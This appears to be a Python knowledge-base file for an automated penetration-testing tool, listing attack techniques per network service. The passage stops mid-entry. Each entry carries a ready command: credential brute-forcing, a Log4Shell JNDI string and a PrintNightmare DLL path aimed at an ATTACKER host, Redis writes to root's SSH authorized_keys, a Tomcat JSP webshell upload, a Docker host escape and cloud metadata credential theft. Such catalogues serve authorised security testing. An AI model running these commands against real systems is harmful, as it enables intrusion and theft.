"""Attacker-side knowledge base — attack vectors per service/port.

Each entry describes one concrete attack technique that a penetration tester
would attempt against a discovered service. The entries are ingested into the
'attack_playbook' ChromaDB collection at startup and retrieved during the
pentest-plan generation stage.

Entry schema
------------
id              : unique string key
service         : nmap service name (e.g. "ssh", "http", "ftp")
ports           : list of common port numbers for this service
attack_name     : short human-readable name
description     : 1-2 sentence explanation
preconditions   : list of required conditions
tools           : list of tool names
quick_command   : representative command with TARGET placeholder
cve_refs        : list of CVE IDs (may be empty)
mitre_technique : MITRE ATT&CK T-ID
severity        : CRITICAL | HIGH | MEDIUM | LOW
expected_evidence : what success looks like
false_positive_notes : common false positives or blockers
"""

PLAYBOOK: list[dict] = [

    # =========================================================
    # SSH  (port 22)
    # =========================================================
    {
        "id": "ssh_default_creds",
        "service": "ssh",
        "ports": [22],
        "attack_name": "SSH default / common credential login",
        "description": (
            "Many devices and servers ship with default credentials that are never changed. "
            "Trying a curated list of defaults is the fastest path to initial access."
        ),
        "preconditions": ["Port 22 open", "Password authentication enabled"],
        "tools": ["hydra", "medusa", "nmap --script ssh-brute"],
        "quick_command": "hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://TARGET",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "login: <user> password: <pass> in hydra output",
        "false_positive_notes": "fail2ban / DenyHosts will block after 3-5 failures",
    },
    {
        "id": "ssh_password_spray",
        "service": "ssh",
        "ports": [22],
        "attack_name": "SSH password spray / brute force",
        "description": (
            "Systematic credential testing using common username and password lists. "
            "Slow-spray mode avoids lockout while still covering high-probability creds."
        ),
        "preconditions": ["Port 22 open", "Password authentication enabled"],
        "tools": ["hydra", "medusa", "patator"],
        "quick_command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -W 3 ssh://TARGET",
        "cve_refs": [],
        "mitre_technique": "T1110.003",
        "severity": "HIGH",
        "expected_evidence": "[22][ssh] host: TARGET   login: <user>   password: <pass>",
        "false_positive_notes": "Rate limiting and account lockout policies may trigger",
    },
    {
        "id": "ssh_username_enum",
        "service": "ssh",
        "ports": [22],
        "attack_name": "SSH username enumeration (timing oracle)",
        "description": (
            "OpenSSH < 7.7 responds slightly faster when a valid username is supplied. "
            "Timing differences allow enumeration of valid accounts without authentication."
        ),
        "preconditions": ["Port 22 open", "OpenSSH version < 7.7"],
        "tools": ["osueta", "ssh_user_enum.py", "metasploit auxiliary/scanner/ssh/ssh_enumusers"],
        "quick_command": "python3 ssh_user_enum.py --port 22 --userList users.txt --ip TARGET",
        "cve_refs": ["CVE-2018-15473"],
        "mitre_technique": "T1589.003",
        "severity": "MEDIUM",
        "expected_evidence": "Timing delta > 300ms on valid usernames vs invalid",
        "false_positive_notes": "Network jitter can produce false results; repeat 3+ times per username",
    },
    {
        "id": "ssh_key_auth_bypass",
        "service": "ssh",
        "ports": [22],
        "attack_name": "SSH agent forwarding abuse / stolen key reuse",
        "description": (
            "If an attacker has read access to a compromised user's ~/.ssh directory, "
            "private keys can be copied and used to authenticate to other SSH servers that trust the same key."
        ),
        "preconditions": ["Port 22 open", "Key-based auth enabled", "Prior file read access"],
        "tools": ["ssh", "ssh-copy-id"],
        "quick_command": "ssh -i stolen_id_rsa user@TARGET",
        "cve_refs": [],
        "mitre_technique": "T1552.004",
        "severity": "HIGH",
        "expected_evidence": "Shell prompt returned without password prompt",
        "false_positive_notes": "Key may be passphrase-protected; use john or hashcat on the key",
    },
    {
        "id": "ssh_libssh_auth_bypass",
        "service": "ssh",
        "ports": [22],
        "attack_name": "libssh authentication bypass (CVE-2018-10933)",
        "description": (
            "Affected libssh versions accept a MSG_USERAUTH_SUCCESS message sent by the client, "
            "allowing authentication bypass without credentials."
        ),
        "preconditions": ["Port 22 open", "libssh 0.6.0-0.7.5 or 0.8.0-0.8.3"],
        "tools": ["exploit-db 46307", "msf auxiliary/scanner/ssh/libssh_auth_bypass"],
        "quick_command": "msfconsole -q -x 'use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS TARGET; run'",
        "cve_refs": ["CVE-2018-10933"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Shell access obtained without password",
        "false_positive_notes": "Only affects servers using libssh (not OpenSSH)",
    },

    # =========================================================
    # HTTP / HTTPS  (ports 80, 443, 8000, 8080, 8443)
    # =========================================================
    {
        "id": "http_dir_enum",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Directory and file enumeration",
        "description": (
            "Brute-force common paths to discover admin panels, backup files, "
            "configuration files, and unlinked endpoints."
        ),
        "preconditions": ["HTTP/HTTPS port open"],
        "tools": ["gobuster", "feroxbuster", "dirb", "ffuf"],
        "quick_command": "gobuster dir -u http://TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,bak,txt",
        "cve_refs": [],
        "mitre_technique": "T1083",
        "severity": "MEDIUM",
        "expected_evidence": "Status 200/301 responses to common paths like /admin, /backup, /.git",
        "false_positive_notes": "Rate limiting, WAF blocking, or custom 404 pages may distort results",
    },
    {
        "id": "http_default_creds",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Web application default credentials",
        "description": (
            "Admin panels for CMS, network devices, and web apps often have well-known default credentials. "
            "Check /admin, /wp-admin, /manager, /console before attempting brute force."
        ),
        "preconditions": ["HTTP/HTTPS port open", "Login form discovered"],
        "tools": ["hydra", "burpsuite", "browser manual"],
        "quick_command": "hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "HIGH",
        "expected_evidence": "302 redirect to dashboard after login, authenticated session cookie",
        "false_positive_notes": "CSRF tokens may prevent automated form submission; use Burp Suite Intruder instead",
    },
    {
        "id": "http_git_exposure",
        "service": "http",
        "ports": [80, 443, 8080],
        "attack_name": "Exposed .git directory",
        "description": (
            "A publicly reachable .git directory allows reconstruction of the full source code, "
            "commit history, and any secrets (API keys, passwords) ever committed."
        ),
        "preconditions": ["HTTP/HTTPS port open", "/.git/HEAD returns 200"],
        "tools": ["git-dumper", "gittools", "curl"],
        "quick_command": "git-dumper http://TARGET/.git ./dumped-repo && cd dumped-repo && git log --all",
        "cve_refs": [],
        "mitre_technique": "T1552.001",
        "severity": "CRITICAL",
        "expected_evidence": "Source code, config files, or credentials recovered from repo history",
        "false_positive_notes": "403 on .git/HEAD does not mean it is inaccessible — try /.git/config",
    },
    {
        "id": "http_sqli",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "SQL injection",
        "description": (
            "User-controlled input passed to SQL queries without sanitisation allows "
            "authentication bypass, data exfiltration, and (on some DBs) OS command execution."
        ),
        "preconditions": ["HTTP/HTTPS port open", "Web application with database backend"],
        "tools": ["sqlmap", "burpsuite", "ghauri"],
        "quick_command": "sqlmap -u 'http://TARGET/page?id=1' --dbs --batch --level=3 --risk=2",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Database banner, table dump, or error message revealing query structure",
        "false_positive_notes": "WAFs may block automated payloads; try --tamper=space2comment",
    },
    {
        "id": "http_lfi",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Local file inclusion (LFI)",
        "description": (
            "Parameters that load file paths (e.g. ?page=about) may be manipulated with "
            "directory traversal to read /etc/passwd, config files, or SSH keys."
        ),
        "preconditions": ["HTTP/HTTPS port open", "File-loading parameter in URL or body"],
        "tools": ["burpsuite", "ffuf", "lfimap"],
        "quick_command": "ffuf -u 'http://TARGET/index.php?page=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "Contents of /etc/passwd or application config file returned in response",
        "false_positive_notes": "PHP wrappers (php://filter) can bypass simple path filters",
    },
    {
        "id": "http_ssrf",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Server-Side Request Forgery (SSRF)",
        "description": (
            "Parameters accepting URLs may be manipulated to make the server issue internal requests, "
            "reaching metadata services (169.254.169.254), internal APIs, or other services on the network."
        ),
        "preconditions": ["HTTP/HTTPS port open", "URL-accepting parameter found"],
        "tools": ["burpsuite", "ssrfmap", "curl"],
        "quick_command": "curl -s 'http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "cve_refs": [],
        "mitre_technique": "T1090",
        "severity": "HIGH",
        "expected_evidence": "AWS/GCP/Azure metadata, internal service response, or internal IP disclosure",
        "false_positive_notes": "IMDSv2 (AWS) requires PUT request with token; adjust for cloud provider",
    },
    {
        "id": "http_apache_path_traversal",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "Apache httpd path traversal and RCE (CVE-2021-41773 / CVE-2021-42013)",
        "description": (
            "Apache 2.4.49-2.4.50 allows unauthenticated path traversal via URL-encoded path separators "
            "and, when mod_cgi is enabled, remote code execution."
        ),
        "preconditions": ["Apache 2.4.49 or 2.4.50 detected"],
        "tools": ["curl", "nuclei", "msf exploit/multi/http/apache_normalize_path_rce"],
        "quick_command": "curl -s --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
        "cve_refs": ["CVE-2021-41773", "CVE-2021-42013"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "/etc/passwd contents returned or RCE output visible",
        "false_positive_notes": "Requires mod_cgi for RCE; read-only traversal works without it",
    },
    {
        "id": "http_missing_security_headers",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Missing security headers (XSS / clickjacking surface)",
        "description": (
            "Absence of Content-Security-Policy, X-Frame-Options, and X-Content-Type-Options "
            "leaves the application open to XSS, clickjacking, and MIME-sniffing attacks."
        ),
        "preconditions": ["HTTP/HTTPS port open"],
        "tools": ["curl", "nuclei", "securityheaders.com"],
        "quick_command": "curl -sI http://TARGET | grep -iE 'x-frame|content-security|x-content-type'",
        "cve_refs": [],
        "mitre_technique": "T1059.007",
        "severity": "MEDIUM",
        "expected_evidence": "Headers absent from response; XSS payload executes in browser",
        "false_positive_notes": "Headers may be set at CDN/WAF layer not visible in direct scan",
    },

    # =========================================================
    # FTP  (port 21)
    # =========================================================
    {
        "id": "ftp_anonymous_login",
        "service": "ftp",
        "ports": [21],
        "attack_name": "FTP anonymous login",
        "description": (
            "Many FTP servers allow anonymous access (username: anonymous, password: any email). "
            "Readable directories may contain sensitive files; writable directories enable file planting."
        ),
        "preconditions": ["Port 21 open"],
        "tools": ["ftp", "nmap --script ftp-anon", "curl"],
        "quick_command": "nmap -p 21 --script ftp-anon TARGET",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "HIGH",
        "expected_evidence": "230 Login successful message; directory listing without credentials",
        "false_positive_notes": "Some servers allow anonymous login to public directories only",
    },
    {
        "id": "ftp_brute_force",
        "service": "ftp",
        "ports": [21],
        "attack_name": "FTP credential brute force",
        "description": "Systematically test username/password combinations against the FTP service.",
        "preconditions": ["Port 21 open", "Anonymous login disabled"],
        "tools": ["hydra", "medusa"],
        "quick_command": "hydra -L users.txt -P passwords.txt ftp://TARGET",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials found; authenticated FTP session established",
        "false_positive_notes": "FTP servers often rate-limit or block after repeated failures",
    },
    {
        "id": "ftp_vsftpd_backdoor",
        "service": "ftp",
        "ports": [21],
        "attack_name": "vsftpd 2.3.4 backdoor RCE",
        "description": (
            "A backdoored version of vsftpd 2.3.4 was distributed for a short period. "
            "Sending a smiley face ':)' in the username triggers a root bind shell on port 6200."
        ),
        "preconditions": ["Port 21 open", "vsftpd 2.3.4 identified"],
        "tools": ["msf exploit/unix/ftp/vsftpd_234_backdoor", "nc"],
        "quick_command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run'",
        "cve_refs": ["CVE-2011-2523"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Root shell on port 6200 after connecting with ':)' username",
        "false_positive_notes": "Only the backdoored distribution is affected; most modern vsftpd are not",
    },

    # =========================================================
    # SMB  (port 445)
    # =========================================================
    {
        "id": "smb_eternal_blue",
        "service": "microsoft-ds",
        "ports": [445],
        "attack_name": "EternalBlue SMBv1 RCE (MS17-010)",
        "description": (
            "A buffer overflow in the SMBv1 implementation allows unauthenticated RCE as SYSTEM. "
            "Used by WannaCry and NotPetya; still present on unpatched Windows systems."
        ),
        "preconditions": ["Port 445 open", "SMBv1 enabled", "Unpatched Windows (pre-MS17-010)"],
        "tools": ["msf exploit/windows/smb/ms17_010_eternalblue", "PoC scripts"],
        "quick_command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; run'",
        "cve_refs": ["CVE-2017-0144", "CVE-2017-0145"],
        "mitre_technique": "T1210",
        "severity": "CRITICAL",
        "expected_evidence": "SYSTEM shell; meterpreter session opened",
        "false_positive_notes": "Most modern Windows systems are patched; verify SMBv1 is actually enabled",
    },
    {
        "id": "smb_null_session",
        "service": "microsoft-ds",
        "ports": [445],
        "attack_name": "SMB null session enumeration",
        "description": (
            "Older SMB configurations allow unauthenticated connections that can enumerate "
            "shares, users, groups, and domain information."
        ),
        "preconditions": ["Port 445 open", "SMB null sessions permitted (older Windows/Samba)"],
        "tools": ["enum4linux", "smbclient", "rpcclient", "nmap --script smb-enum-shares"],
        "quick_command": "enum4linux -a TARGET",
        "cve_refs": [],
        "mitre_technique": "T1135",
        "severity": "MEDIUM",
        "expected_evidence": "Share list, user list, and domain info returned without credentials",
        "false_positive_notes": "Disabled by default on modern Windows; common on legacy Samba",
    },
    {
        "id": "smb_relay",
        "service": "microsoft-ds",
        "ports": [445],
        "attack_name": "SMB relay / NTLM relay attack",
        "description": (
            "When SMB signing is not enforced, captured NTLM authentication challenges can be "
            "relayed to other services to authenticate as the captured user."
        ),
        "preconditions": ["Port 445 open", "SMB signing not required", "MITM position or responder"],
        "tools": ["responder", "impacket ntlmrelayx.py"],
        "quick_command": "python3 ntlmrelayx.py -tf targets.txt -smb2support",
        "cve_refs": [],
        "mitre_technique": "T1557.001",
        "severity": "HIGH",
        "expected_evidence": "Authenticated SMB session, SAM dump, or code execution as relayed user",
        "false_positive_notes": "Requires network-level MITM position or Responder poisoning first",
    },
    {
        "id": "smb_printnightmare",
        "service": "microsoft-ds",
        "ports": [445],
        "attack_name": "PrintNightmare Windows Print Spooler RCE",
        "description": (
            "A vulnerability in the Windows Print Spooler service allows authenticated users "
            "to achieve SYSTEM-level code execution via a malicious DLL."
        ),
        "preconditions": ["Port 445 open", "Print Spooler service running", "Any valid domain credentials"],
        "tools": ["impacket PrintNightmare PoC", "msf exploit/windows/dcerpc/cve_2021_1675_printnightmare"],
        "quick_command": "python3 CVE-2021-1675.py DOMAIN/user:pass@TARGET '\\\\ATTACKER\\share\\evil.dll'",
        "cve_refs": ["CVE-2021-1675", "CVE-2021-34527"],
        "mitre_technique": "T1547.012",
        "severity": "CRITICAL",
        "expected_evidence": "SYSTEM shell; DLL loaded by print spooler process",
        "false_positive_notes": "Requires valid low-privilege domain credentials",
    },

    # =========================================================
    # MySQL  (port 3306)
    # =========================================================
    {
        "id": "mysql_default_creds",
        "service": "mysql",
        "ports": [3306],
        "attack_name": "MySQL default / empty root credentials",
        "description": (
            "MySQL installations frequently have root with an empty password or 'root'/'password'. "
            "Successful login enables full database access and potentially OS command execution via INTO OUTFILE."
        ),
        "preconditions": ["Port 3306 open and accessible remotely"],
        "tools": ["mysql client", "hydra", "nmap --script mysql-empty-password"],
        "quick_command": "nmap -p 3306 --script mysql-empty-password,mysql-info TARGET",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "mysql> prompt without password; access to all databases",
        "false_positive_notes": "Remote root login is often disabled even when local root has no password",
    },
    {
        "id": "mysql_udf_rce",
        "service": "mysql",
        "ports": [3306],
        "attack_name": "MySQL UDF privilege escalation to OS RCE",
        "description": (
            "With FILE and CREATE privileges, an attacker can load a malicious shared library "
            "as a MySQL user-defined function (UDF) and execute OS commands as the mysql user."
        ),
        "preconditions": ["MySQL access with FILE privilege", "Write permission to plugin directory"],
        "tools": ["raptor_udf2.c PoC", "sqlmap --os-shell", "msf exploit/multi/mysql/mysql_udf_payload"],
        "quick_command": "sqlmap -u 'http://TARGET/vuln?id=1' --os-shell --technique=E",
        "cve_refs": [],
        "mitre_technique": "T1055",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output returned via MySQL query result",
        "false_positive_notes": "Requires high-privilege MySQL user; secure_file_priv must not restrict path",
    },
    {
        "id": "mysql_brute",
        "service": "mysql",
        "ports": [3306],
        "attack_name": "MySQL credential brute force",
        "description": "Test common username/password combinations against the MySQL service.",
        "preconditions": ["Port 3306 open and remotely accessible"],
        "tools": ["hydra", "medusa", "nmap --script mysql-brute"],
        "quick_command": "hydra -L users.txt -P passwords.txt TARGET mysql",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials; authenticated MySQL session",
        "false_positive_notes": "MySQL often does not rate-limit; watch for max_connect_errors lockout",
    },

    # =========================================================
    # Redis  (port 6379)
    # =========================================================
    {
        "id": "redis_no_auth",
        "service": "redis",
        "ports": [6379],
        "attack_name": "Redis unauthenticated access",
        "description": (
            "Redis is frequently deployed without authentication. Unauthenticated access allows "
            "reading all cached data and, via CONFIG SET, writing arbitrary files including SSH keys."
        ),
        "preconditions": ["Port 6379 open", "No requirepass set"],
        "tools": ["redis-cli", "nmap --script redis-info"],
        "quick_command": "redis-cli -h TARGET PING && redis-cli -h TARGET INFO server",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "PONG response; server information returned without authentication",
        "false_positive_notes": "Protected-mode may block remote access even without a password",
    },
    {
        "id": "redis_rce_via_config",
        "service": "redis",
        "ports": [6379],
        "attack_name": "Redis RCE via CONFIG SET (SSH key or cron injection)",
        "description": (
            "With unauthenticated access, CONFIG SET dir/dbfilename can write a Redis dump "
            "to /root/.ssh/authorized_keys or /etc/cron.d/, achieving OS-level persistence."
        ),
        "preconditions": ["Port 6379 open", "No auth", "Redis running as root or privileged user"],
        "tools": ["redis-cli", "redis-rogue-server"],
        "quick_command": "redis-cli -h TARGET CONFIG SET dir /root/.ssh && redis-cli -h TARGET CONFIG SET dbfilename authorized_keys && redis-cli -h TARGET SET x '\\n\\nssh-rsa AAAA...\\n\\n' && redis-cli -h TARGET BGSAVE",
        "cve_refs": [],
        "mitre_technique": "T1098.004",
        "severity": "CRITICAL",
        "expected_evidence": "SSH key written; SSH login as root without password",
        "false_positive_notes": "Redis running as non-root cannot write to /root/.ssh",
    },
    {
        "id": "redis_ssrf_pivot",
        "service": "redis",
        "ports": [6379],
        "attack_name": "Redis SSRF pivot via Gopher protocol",
        "description": (
            "Applications vulnerable to SSRF can be used to tunnel Redis commands via the Gopher "
            "protocol, enabling unauthenticated Redis access through a web application."
        ),
        "preconditions": ["SSRF vulnerability in a web app", "Redis on internal network (127.0.0.1:6379)"],
        "tools": ["Gopherus", "burpsuite"],
        "quick_command": "python3 gopherus.py --exploit redis",
        "cve_refs": [],
        "mitre_technique": "T1090",
        "severity": "HIGH",
        "expected_evidence": "Redis command responses returned via SSRF payload",
        "false_positive_notes": "Gopher support must be enabled in the web server's HTTP client",
    },

    # =========================================================
    # MongoDB  (port 27017)
    # =========================================================
    {
        "id": "mongodb_no_auth",
        "service": "mongod",
        "ports": [27017],
        "attack_name": "MongoDB unauthenticated access",
        "description": (
            "Older MongoDB deployments bind to 0.0.0.0 without authentication, allowing "
            "unauthenticated full read/write access to all databases."
        ),
        "preconditions": ["Port 27017 open", "No authentication configured"],
        "tools": ["mongosh", "mongo", "nmap --script mongodb-info"],
        "quick_command": "mongosh TARGET:27017 --eval 'db.adminCommand({listDatabases:1})'",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "Database list returned without credentials",
        "false_positive_notes": "MongoDB 3.6+ binds to 127.0.0.1 by default; external access requires explicit config",
    },
    {
        "id": "mongodb_nosql_injection",
        "service": "mongod",
        "ports": [27017, 80, 443],
        "attack_name": "NoSQL injection via MongoDB operators",
        "description": (
            "Web applications that pass unsanitized user input to MongoDB queries can be exploited "
            "using operators like $ne, $gt, or $regex to bypass authentication or extract data."
        ),
        "preconditions": ["Web app using MongoDB backend", "User input reflected in queries"],
        "tools": ["burpsuite", "nosqlmap"],
        "quick_command": "nosqlmap --attack 1 --url http://TARGET/login --postdata 'user=admin&pass=admin'",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "HIGH",
        "expected_evidence": "Authentication bypass or data extraction using $ne:1 or similar operator",
        "false_positive_notes": "Requires web application fronting MongoDB; not a direct MongoDB vector",
    },

    # =========================================================
    # Elasticsearch  (port 9200)
    # =========================================================
    {
        "id": "elasticsearch_no_auth",
        "service": "http",
        "ports": [9200],
        "attack_name": "Elasticsearch unauthenticated access",
        "description": (
            "Elasticsearch versions prior to 8.0 have no authentication by default. "
            "Unauthenticated access exposes all indices including sensitive PII, credentials, and logs."
        ),
        "preconditions": ["Port 9200 open", "No X-Pack security / TLS disabled"],
        "tools": ["curl", "elasticsearch-dump", "nmap"],
        "quick_command": "curl -s http://TARGET:9200/_cat/indices?v && curl -s http://TARGET:9200/_cat/shards",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "Cluster health and index listing returned without authentication",
        "false_positive_notes": "Elasticsearch 8.x has security enabled by default; older versions do not",
    },
    {
        "id": "elasticsearch_log4shell",
        "service": "http",
        "ports": [9200, 443, 80],
        "attack_name": "Log4Shell RCE via Elasticsearch (CVE-2021-44228)",
        "description": (
            "Elasticsearch versions using Log4j 2.0-2.14.1 are vulnerable to Log4Shell. "
            "Injecting JNDI lookup strings in headers or search queries triggers remote class loading."
        ),
        "preconditions": ["Elasticsearch using Log4j 2.0-2.14.1", "Outbound LDAP/RMI allowed"],
        "tools": ["log4j-scan", "ysoserial", "marshalsec"],
        "quick_command": "curl -s http://TARGET:9200 -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}'",
        "cve_refs": ["CVE-2021-44228", "CVE-2021-45046"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "DNS/LDAP callback received at attacker server; RCE confirmed",
        "false_positive_notes": "Most deployments patched; verify Log4j version before exploitation",
    },

    # =========================================================
    # RDP  (port 3389)
    # =========================================================
    {
        "id": "rdp_bluekeep",
        "service": "ms-wbt-server",
        "ports": [3389],
        "attack_name": "BlueKeep RDP pre-auth RCE (CVE-2019-0708)",
        "description": (
            "A use-after-free vulnerability in the Remote Desktop Services allows unauthenticated "
            "RCE on unpatched Windows 7 / Server 2008 systems."
        ),
        "preconditions": ["Port 3389 open", "Windows 7 or Server 2008 R2 unpatched"],
        "tools": ["msf exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "rdpscan"],
        "quick_command": "rdpscan TARGET --check",
        "cve_refs": ["CVE-2019-0708"],
        "mitre_technique": "T1210",
        "severity": "CRITICAL",
        "expected_evidence": "VULNERABLE status from rdpscan; SYSTEM shell via Metasploit",
        "false_positive_notes": "Windows 8+ not affected; may cause BSOD if exploit parameters incorrect",
    },
    {
        "id": "rdp_brute",
        "service": "ms-wbt-server",
        "ports": [3389],
        "attack_name": "RDP credential brute force",
        "description": (
            "Systematic testing of username/password combinations against Remote Desktop. "
            "Often successful against systems with weak passwords or default admin credentials."
        ),
        "preconditions": ["Port 3389 open"],
        "tools": ["hydra", "crowbar", "ncrack"],
        "quick_command": "crowbar -b rdp -s TARGET/32 -U users.txt -C passwords.txt",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials; RDP session established",
        "false_positive_notes": "Account lockout after 5-10 failures is common; use slow/spray mode",
    },

    # =========================================================
    # Jenkins  (port 8080)
    # =========================================================
    {
        "id": "jenkins_default_creds",
        "service": "http",
        "ports": [8080, 8443],
        "attack_name": "Jenkins default credentials / setup wizard bypass",
        "description": (
            "Jenkins instances left in setup state or with default admin credentials "
            "allow access to the Script Console which provides Groovy-based RCE."
        ),
        "preconditions": ["Jenkins port open", "Login page accessible"],
        "tools": ["browser", "burpsuite", "jenkins-cli.jar"],
        "quick_command": "curl -s http://TARGET:8080/login | grep -i 'jenkins'",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "Access to Jenkins dashboard; /script console accessible",
        "false_positive_notes": "Initial admin password is in /var/jenkins_home/secrets/initialAdminPassword",
    },
    {
        "id": "jenkins_script_console_rce",
        "service": "http",
        "ports": [8080, 8443],
        "attack_name": "Jenkins Script Console Groovy RCE",
        "description": (
            "Authenticated access to the Jenkins Script Console (/script) allows execution of "
            "arbitrary Groovy code running as the Jenkins OS user."
        ),
        "preconditions": ["Jenkins admin credentials", "/script page accessible"],
        "tools": ["browser", "curl"],
        "quick_command": "curl -s -u admin:password http://TARGET:8080/script -d 'script=println+\"id\".execute().text'",
        "cve_refs": [],
        "mitre_technique": "T1059.005",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output returned in browser or response body",
        "false_positive_notes": "Requires admin access; Script Console may be disabled in some configurations",
    },
    {
        "id": "jenkins_cve_2024_23897",
        "service": "http",
        "ports": [8080, 8443],
        "attack_name": "Jenkins arbitrary file read via CLI (CVE-2024-23897)",
        "description": (
            "Jenkins CLI uses the args4j library in a way that allows unauthenticated attackers "
            "to read arbitrary files from the Jenkins controller filesystem."
        ),
        "preconditions": ["Jenkins < 2.442 / LTS < 2.426.3", "CLI enabled (default)"],
        "tools": ["jenkins-cli.jar", "exploit PoC scripts"],
        "quick_command": "java -jar jenkins-cli.jar -s http://TARGET:8080 help '@/etc/passwd'",
        "cve_refs": ["CVE-2024-23897"],
        "mitre_technique": "T1005",
        "severity": "CRITICAL",
        "expected_evidence": "/etc/passwd contents in CLI output",
        "false_positive_notes": "Patched in Jenkins 2.442 / LTS 2.426.3; check version first",
    },

    # =========================================================
    # Apache Tomcat  (port 8080 / 8443)
    # =========================================================
    {
        "id": "tomcat_manager_creds",
        "service": "http",
        "ports": [8080, 8443],
        "attack_name": "Tomcat Manager console default credentials",
        "description": (
            "The Tomcat /manager/html application often has default credentials "
            "(tomcat:tomcat, admin:admin) and allows WAR file deployment — direct path to RCE."
        ),
        "preconditions": ["/manager/html accessible"],
        "tools": ["hydra", "msf auxiliary/scanner/http/tomcat_mgr_login", "burpsuite"],
        "quick_command": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS TARGET; run'",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "200 response to /manager/html with valid credentials; WAR upload available",
        "false_positive_notes": "Manager is often bound to localhost only; check if it is externally exposed",
    },
    {
        "id": "tomcat_cve_2017_12617",
        "service": "http",
        "ports": [8080, 8443],
        "attack_name": "Tomcat JSP upload via PUT (CVE-2017-12617)",
        "description": (
            "When the DefaultServlet has readonly=false, an attacker can upload a JSP webshell "
            "via HTTP PUT and execute OS commands."
        ),
        "preconditions": ["Tomcat 7.0.0-7.0.81, 8.x, or 9.x with readonly=false"],
        "tools": ["curl", "msf exploit/multi/http/tomcat_jsp_upload_bypass"],
        "quick_command": "curl -v -X PUT http://TARGET:8080/shell.jsp -d '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>'",
        "cve_refs": ["CVE-2017-12617"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "JSP uploaded; command execution via http://TARGET:8080/shell.jsp?cmd=id",
        "false_positive_notes": "readonly=false is not the default; must be explicitly misconfigured",
    },

    # =========================================================
    # Docker API  (port 2375 / 2376)
    # =========================================================
    {
        "id": "docker_api_no_auth",
        "service": "docker",
        "ports": [2375, 2376],
        "attack_name": "Docker daemon API unauthenticated access",
        "description": (
            "An exposed Docker API without TLS authentication allows complete container "
            "management — create, start, delete, and volume mount to escape to host filesystem."
        ),
        "preconditions": ["Port 2375 open (plain) or 2376 (TLS without client cert auth)"],
        "tools": ["docker CLI", "curl"],
        "quick_command": "docker -H tcp://TARGET:2375 ps && docker -H tcp://TARGET:2375 run -v /:/host -it ubuntu chroot /host",
        "cve_refs": [],
        "mitre_technique": "T1611",
        "severity": "CRITICAL",
        "expected_evidence": "Container list returned; host filesystem mounted inside container",
        "false_positive_notes": "Port 2375 exposes plaintext API; 2376 may require client certs (less common)",
    },

    # =========================================================
    # SNMP  (port 161 UDP)
    # =========================================================
    {
        "id": "snmp_community_string",
        "service": "snmp",
        "ports": [161],
        "attack_name": "SNMP default community string enumeration",
        "description": (
            "SNMPv1/v2c use community strings as authentication. Default strings 'public' and 'private' "
            "allow reading all MIB data including network topology, running processes, and installed software."
        ),
        "preconditions": ["UDP port 161 open", "SNMP v1 or v2c enabled"],
        "tools": ["snmpwalk", "onesixtyone", "snmp-check", "nmap --script snmp-info"],
        "quick_command": "onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt TARGET",
        "cve_refs": [],
        "mitre_technique": "T1046",
        "severity": "HIGH",
